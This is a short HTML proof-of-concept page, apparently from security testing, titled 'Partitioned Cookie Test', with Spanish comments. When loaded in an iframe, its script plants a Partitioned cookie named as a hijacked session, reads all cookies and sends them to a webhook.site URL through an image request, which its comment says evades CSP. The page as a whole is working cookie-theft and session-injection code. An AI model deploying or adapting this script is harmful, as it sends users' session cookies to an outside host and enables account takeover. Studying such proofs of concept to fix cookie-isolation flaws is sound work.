<!DOCTYPE html>
<html>
<body>
    <h2>Partitioned Cookie Test</h2>
    <pre id="log" style="background:#000; color:#0f0; padding:10px;"></pre>

    <script>
        const logEl = document.getElementById('log');
        const webhookUrl = "https://webhook.site/118f2af5-6014-4c45-ab14-1543fc773f54";

        function log(msg) {
            logEl.textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
        }

        log("Origen actual: " + window.location.origin);
        log("¿Es Top Frame? " + (window.self === window.top));

        // 1. Escribimos una cookie Partitioned (CHIPS)
        try {
            document.cookie = "muse_session_hijacked=CUENTA_2_HACKEADA; path=/; secure; SameSite=None; Partitioned";
            log("✅ Cookie Partitioned inyectada en el iframe");
        } catch (e) {
            log("❌ Error al inyectar: " + e.message);
        }

        // 2. Leemos las cookies
        log("Cookies actuales: " + document.cookie);

        // 3. Exfiltramos al webhook (vía Image Tag, evita CSP)
        const img = new Image();
        img.src = `${webhookUrl}?cookie_partitioned=true&data=${encodeURIComponent(document.cookie)}`;
        log("📤 Exfiltración enviada al webhook.");
    </script>
</body>
</html>
